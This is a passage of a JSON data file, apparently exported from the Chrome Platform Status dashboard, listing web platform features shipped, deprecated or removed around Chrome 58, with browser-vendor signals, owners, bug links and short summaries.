        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://www.w3.org/2016/09/23-webperf-irc",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://www.w3.org/2016/09/23-webperf-irc",
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "A performance API to enable applications to detect presence of “long tasks” that monopolize the UI thread for extended periods of time and block other critical tasks from being executed - e.g. reacting to user input.",
    "id": 5738471184400384,
    "resources": {
      "docs": [
        "https://github.com/w3c/longtasks",
        "https://developer.mozilla.org/en-US/docs/Web/API/Long_Tasks_API"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-06-14 18:28:45.780190",
      "by": "ericbidelman@google.com"
    },
    "name": "Mouse on Android stops firing TouchEvents",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 5
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 58
        },
        "owners": [
          "mustaq@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 58,
        "blink_components": [
          "Blink>Input"
        ],
        "flag": false,
        "android": 58,
        "bug": "http://crbug.com/468806",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "A mouse on an Android M (or later) device:\r\n(a) will no longer fire TouchEvents, and\r\n(b) will fire a consistent sequence of MouseEvents with appropriate buttons & other properties.\r\n\r\nBefore this change, a low-level mouse events in Android reached blink as a touch event, hence fired a touch event then a compat mouse event if the touch event went uncanceled.",
    "id": 5642080642662400,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1mpBR7J7kgTXvp0QACVjhxtwNJ7bgGoTMmxfxN2dupGg/edit?usp=sharing"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:29:01.040330",
      "by": "ericbidelman@google.com"
    },
    "name": "Native media controls customization",
    "tags": [
      "media",
      "controls",
      "default controls"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/whatwg/html/issues/2293#issuecomment-276902614",
          "text": "Public skepticism",
          "val": 6
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 58
        },
        "owners": [
          "avayvod@chromium.org",
          "mlamouri@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Media>Controls"
        ],
        "desktop": 58,
        "flag": false,
        "android": 58,
        "bug": "https://crbug.com/685018",
        "intervention": false
      },
      "opera": {
        "android": 45,
        "desktop": 45
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://github.com/whatwg/html/issues/2293#issuecomment-275749536",
          "text": "Opposed",
          "val": 7
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "We propose extending the “controls” attribute of the HTMLMediaElement so that the website could enable/disable certain media controls without having to implement all the controls on its own. A “controlsList” property will be added reflecting the current value of “controls” similar to the “class” and “classList” on HTMLElement.",
    "id": 5737006365671424,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/controlsList"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-06-14 18:28:35.634140",
      "by": "ericbidelman@google.com"
    },
    "name": "Offline Previews",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 58
        },
        "owners": [
          "ryansturm@chromium.org",
          "bengr@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Previews"
        ],
        "flag": false,
        "android": 58,
        "bug": "http://crbug.com/632865",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "When users are on slow connections, Chrome will show an offline copy of a page if  there is an offline version of the page available on the user’s device. Users will see a message at the bottom of their screens that allows them to load the original page.\r\nIf Chrome determines the network has 2G speeds and there's an offline page stored, Chrome shows the offline page. Chrome’s offline pages are based on MHTML snapshots. ",
    "id": 5076871637106688,
    "resources": {}
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:28:47.127440",
      "by": "ericbidelman@google.com"
    },
    "name": "Pause autoplaying muted video by attribute when invisible (Android)",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 58
        },
        "owners": [
          "zqzhang@chromium.org",
          "mlamouri@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "android": 58,
        "bug": "https://crbug.com/690468",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "As a muted video with autoplay attribute only starts playing when it's becoming visible, it's reasonable to pause them when invisible to reduce power usage.",
    "id": 5651339115757568,
    "resources": {
      "docs": [
        "https://github.com/whatwg/html/pull/2324"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/muted-autoplay/index.html"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-06-14 22:17:01.443500",
      "by": "jmedley@google.com"
    },
    "name": "PointerEvent.getCoalescedEvents",
    "tags": [
      "PointerEvents",
      "Coalesced Events",
      "Coalesced Points",
      "getCoalescedEvents",
      "getHistoricalEvents",
      "Historial Point API"
    ],
    "comments": "PointerEvents, Historical, Coalesced, Coalesced",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/pointerevents/extension.html",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://lists.w3.org/Archives/Public/public-pointer-events/2016OctDec/0048.html",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 58
        },
        "owners": [
          "nzolghadr@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "ios": 58,
        "blink_components": [
          "Blink>Input"
        ],
        "desktop": 58,
        "flag": false,
        "android": 58,
        "bug": "https://crbug.com/656781",
        "intervention": false
      },
      "opera": {
        "android": 45,
        "desktop": 45
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "An API to return all the coalesced events of the received events in javascript. This API enables apps like drawing app to draw smoother curves using the precise history of points.",
    "id": 5853451217010688,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/PointerEvent/getCoalescedEvents"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-01-04 02:36:57.424250",
      "by": "jmedley@google.com"
    },
    "name": "RTCPeerConnection.getStats",
    "tags": [
      "WebRTC",
      "RTCPeerConnection",
      "getStats",
      "RTCStats",
      "RTCStatsReport"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/webrtc-stats/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 58
        },
        "owners": [
          "hbos@chromium.org",
          "hta@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 55,
        "blink_components": [
          "Blink>WebRTC"
        ],
        "desktop": 58,
        "flag": false,
        "android": 58,
        "bug": "http://crbug.com/685655",
        "intervention": false
      },
      "opera": {
        "android": 45,
        "desktop": 45
      },
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This is a spec-compliant version of RTCPeerConnection.getStats returning a promise resolved with RTCStatsReport, a maplike containing RTCStats dictionaries.\r\nStats are being implemented according to the spec in a continuous effort for coverage to become good enough that the old getStats method can be deprecated.\r\n\r\nThe old getStats (taking a callback as argument) is very different from the spec and riddled with goog-prefixed things.",
    "id": 5665052275245056,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1Wc6a4o0PqTxIWD7LM_smA7Z0GZUTy6XOgr1qyS4M7hQ/edit?usp=sharing",
        "https://cs.chromium.org/chromium/src/third_party/webrtc/api/stats/rtcstats_objects.h",
        "https://developer.mozilla.org/en-US/docs/Web/API/RTCRtpReceiver/getStats"
      ]
    }
  },
  {
    "category": "Realtime / Communication",
    "updated": {
      "when": "2017-08-07 22:08:55.403600",
      "by": "jmedley@google.com"
    },
    "name": "RTCPeerConnection.setConfiguration",
    "tags": [
      "WebRTC",
      "RTCConfiguration",
      "setConfiguration"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://www.w3.org/TR/webrtc/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1253706",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 58
        },
        "owners": [
          "deadbeef@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 58,
        "blink_components": [
          "Blink>WebRTC>Network"
        ],
        "desktop": 58,
        "flag": false,
        "android": 58,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=587453",
        "intervention": false
      },
      "opera": {
        "android": 45,
        "desktop": 45
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Implement setConfiguration according to WebRTC 1.0 and JSEP. This API allows an application to change the set of ICE servers, ICE candidate policy, and ICE candidate pool size without creating a new RTCPeerConnection.",
    "id": 5596193748942848,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/RTCPeerConnection/setConfiguration"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:34.479440",
      "by": "ericbidelman@google.com"
    },
    "name": "Remove \"reset\" and \"document\" as valid zoom values",
    "tags": [
      "zoom",
      "reset",
      "document"
    ],
    "comments": "The zoom proposal draft completely elides \"reset\" and \"document\".\r\n\r\nThe values have low usage and behave in unexpected ways. Edge's number's corroborate low usage.\r\n\r\nSupporting the ability to effectively disable page zoom is user-hostile.",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://cdn.rawgit.com/atanassov/css-zoom/master/Overview.html",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Deprecated",
          "val": 6,
          "milestone_str": 58
        },
        "owners": [
          "bsep@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>CSS"
        ],
        "desktop": 58,
        "flag": false,
        "bug": "http://crbug.com/664668",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://groups.google.com/a/chromium.org/d/msg/Blink-dev/Udxmfvq4Wf8/b1w8bXU0BgAJ",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "There are two special values for the CSS zoom property that are inconsistently documented: \"reset\" and \"document\".\r\n\r\nThey set the element's zoom to 1.0 regardless of parent element zoom status and prevent page zoom from affecting the element's size.\r\n\r\nWe're removing them.",
    "id": 4997605029314560,
    "resources": {
      "docs": [
        "https://groups.google.com/a/chromium.org/forum/#!msg/Blink-dev/Udxmfvq4Wf8/Jy4VsQxGAQAJ"
      ],
      "samples": [
        "foodviva.com",
        "happiestminds.com",
        "ruinergame.com",
        "asiancorrespondent.com",
        "patycantu.com"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:28:59.478270",
      "by": "ericbidelman@google.com"
    },
    "name": "Remove EME from Unsecure Contexts",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1322517",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 58
        },
        "owners": [
          "emilyschechter@chromium.org",
          "ddorwin@chromium.org",
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 58,
        "blink_components": [
          "Blink"
        ],
        "desktop": 58,
        "flag": false,
        "android": 58,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=672605",
        "intervention": false
      },
      "opera": {
        "android": 45,
        "desktop": 45
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Per https://w3c.github.io/webappsec-secure-contexts/, we are deprecating and then removing EME from insecure contexts. EME is a powerful feature that exposes DRM implementations that involve access to persistent unique identifiers, are not open source, and/or run unsandboxed or with privileged access. The risks are increased when exposed via insecure HTTP, because they could be attacked by anyone on the channel. This was deprecated in Chrome 44.",
    "id": 5724389932793856,
    "resources": {
      "docs": [
        "Part of the larger effort to remove powerful features on insecure origins:",
        "https://chromium.org/Home/chromium-security/deprecating-powerful-features-on-insecure-origins",
        "https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/setMediaKeys"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:28:44.153130",
      "by": "ericbidelman@google.com"
    },
    "name": "Remove pre-standard ChaCha20-Poly1305 ciphers",
    "tags": [
      "ssl",
      "tls"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://tools.ietf.org/html/draft-agl-tls-chacha20poly1305-04",
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 58
        },
        "owners": [
          "agl@chromium.org",
          "davidben@chromium.org",
          "awhalley@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 58,
        "ios": 58,
        "blink_components": [
          "Blink"
        ],
        "desktop": 58,
        "flag": false,
        "android": 58,
        "bug": "https://crbug.com/682816",
        "intervention": false
      },
      "opera": {
        "android": 45,
        "desktop": 45
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "In 2013, Chrome 31 deployed new TLS cipher suites based on Prof. Dan Bernstein's ChaCha20 and Poly1305 algorithms. This was later standardized, with small tweaks, at the IETF as RFC 7539 and RFC 7905. We shipped the standardized variant early in 2016 with Chrome 49. We are now removing the pre-standard variants.",
    "id": 5633556340539392,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:29:17.308690",
      "by": "ericbidelman@google.com"
    },
    "name": "Selection API: addRange() ignores additional Ranges",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 58
        },
        "owners": [
          "tkent@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 58,
        "blink_components": [
          "Blink>Editing>Selection"
        ],
        "desktop": 58,
        "flag": false,
        "android": 58,
        "bug": "http://crbug.com/353069",
        "intervention": false
      },
      "opera": {
        "android": 45,
        "desktop": 45
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "In a case where document already has text selection and Selection.addRange() is called, Blink merges the Range and the existing text selection into one if they have overlap, and does nothing otherwise.\r\n\r\nWe'll change it so that Blink always ignore the Range.  It matches to Edge.\r\n",
    "id": 6680566019653632,
    "resources": {
      "docs": [
        "https://github.com/w3c/selection-api/issues/80",
        "https://developer.mozilla.org/en-US/docs/Web/API/Selection/addRange"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:51.507880",
      "by": "ericbidelman@google.com"
    },
    "name": "Selection API: getRangeAt() returns a Range registered by addRange()",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://www.w3.org/TR/selection-api/#dom-selection-getrangeat",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 58
        },
        "owners": [
          "yoichio@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 58,
        "blink_components": [
          "Blink>Editing>Selection"
        ],
        "desktop": 58,
        "flag": false,
        "android": 58,
        "bug": "http://crbug.com/490206",
        "intervention": false
      },
      "opera": {
        "android": 45,
        "desktop": 45
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Blink had a bug that getRangeAt() always returns a new Range with position normalization. It didn't match to Edge, Firefox, and Selection API specification.\r\n",
    "id": 5674751250923520,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:49.994050",
      "by": "ericbidelman@google.com"
    },
    "name": "Selection API: removeRange() function",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://www.w3.org/TR/selection-api/#dom-selection-removerange",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 58
        },
        "owners": [
          "tkent@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 58,
        "blink_components": [
          "Blink>Editing>Selection"
        ],
        "desktop": 58,
        "flag": false,
        "android": 58,
        "bug": "http://crbug.com/692881",
        "intervention": false
      },
      "opera": {
        "android": 45,
        "desktop": 45
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Selection interface should support removeRange() function to remove the specified Range.\r\n",
    "id": 5666939779153920,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Selection/removeRange"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:54.829430",
      "by": "ericbidelman@google.com"
    },
    "name": "Selection API: setBaseAndExtent() throws IndexSizeError for too large offsets",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://www.w3.org/TR/selection-api/#selection-interface",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 58
        },
        "owners": [
          "tkent@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 58,
        "blink_components": [
          "Blink>Editing>Selection"
        ],
        "desktop": 58,
        "flag": false,
        "android": 58,
        "bug": "http://crbug.com/691422",
        "intervention": false
      },
      "opera": {
        "android": 45,
        "desktop": 45
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "setBaseAndExtent() silently clamped too large offset values. IndexSizeError should be thrown for such values to match to Firefox, Edge, and the specification.\r\n",
    "id": 5696359768260608,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:43.900960",
      "by": "ericbidelman@google.com"
    },
    "name": "Selection API: setBaseAndExtent(), extend(), and collapse() throw InvalidNodeTypeError for DOCTYPE",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://www.w3.org/TR/selection-api/#selection-interface",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 58
        },
        "owners": [
          "tkent@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 58,
        "blink_components": [
          "Blink>Editing>Selection"
        ],
        "desktop": 58,
        "flag": false,
        "android": 58,
        "bug": "http://crbug.com/ 691422",
        "intervention": false
      },
      "opera": {
        "android": 45,
        "desktop": 45
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "These function silently normalized the specified position with DOCTYPE. However, they should throw InvalidNodeTypeError to match to Edge, Firefox, and the specification.\r\n",
    "id": 5632500684554240,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2018-05-02 18:12:38.090680",
      "by": "mustaq@google.com"
    },
    "name": "Ship PointerEvent.tangentialPressure and PointerEvent.twist",
    "tags": [
      "Pointer Events"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/pointerevents/#pointerevent-interface",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 58
        },
        "owners": [
          "lanwei@chromium.org",
          "mustaq@chromium.org",
          "nzolghadr@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 58,
        "blink_components": [
          "Blink"
        ],
        "desktop": 58,
        "flag": false,
        "android": 58,
        "bug": "https://crbug.com/649376",
        "intervention": false
      },
      "opera": {
        "android": 45,
        "desktop": 45
      },
      "edge": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "text": "Opposed",
          "val": 7
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Adding support of tangentialPressure and twist attributes in the pointer events API on Mac. They are supported by some stylus devices and are already used in numerous painting apps.\r\n",
    "id": 5765742146355200,
    "resources": {
      "docs": [
        "https://github.com/w3c/pointerevents/issues/70",
        "https://github.com/w3c/pointerevents/issues/25",
        "https://developer.mozilla.org/en-US/docs/Web/API/PointerEvent",
        "https://developer.mozilla.org/en-US/docs/Web/API/PointerEvent/tangentialPressure",
        "https://developer.mozilla.org/en-US/docs/Web/API/PointerEvent/twist"
      ],
      "samples": [
        "https://output.jsbin.com/pahefaz/quiet/"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:28:26.549650",
      "by": "ericbidelman@google.com"
    },
    "name": "Strict Secure Cookies",
    "comments": "Chrome supported this feature behind a flag starting in Chrome 52. In Chrome 58, it was enabled by default.",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://tools.ietf.org/html/draft-ietf-httpbis-cookie-alone-01",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=976073",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 58
        },
        "owners": [
          "jww@chromium.org",
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 58,
        "flag": false,
        "android": 58,
        "bug": "https://crbug.com/568188",
        "intervention": false
      },
      "opera": {
        "android": 45,
        "desktop": 45
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This adds restrictions on cookies marked with the 'Secure' attribute. Currently, Secure cookies cannot be accessed by insecure (e.g. HTTP) origins. However, insecure origins can still add Secure cookies, delete them, or indirectly evict them. This feature modifies the cookie jar so that insecure origins cannot in any way touch Secure cookies. This does leave a carve out for cookie eviction, which still may cause the deletion of Secure cookies, but only after all non-Secure cookies are evicted.",
    "id": 4506322921848832,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-06-14 18:28:34.165600",
      "by": "ericbidelman@google.com"
    },
    "name": "Support for commonName matching in Certificates",
    "comments": "Firefox has removed support in Firefox 48 (meaning \"Supports removal\")",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://tools.ietf.org/html/rfc2818",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1245280",
          "text": "Opposed",
          "val": 7
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 58
        },
        "owners": [
          "rsleevi@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 58,
        "ios": 58,
        "blink_components": [
          "Internals>Network>Certificate"
        ],
        "desktop": 58,
        "flag": false,
        "android": 58,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=308330",
        "intervention": false
      },
      "opera": {
        "android": 45,
        "desktop": 45
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
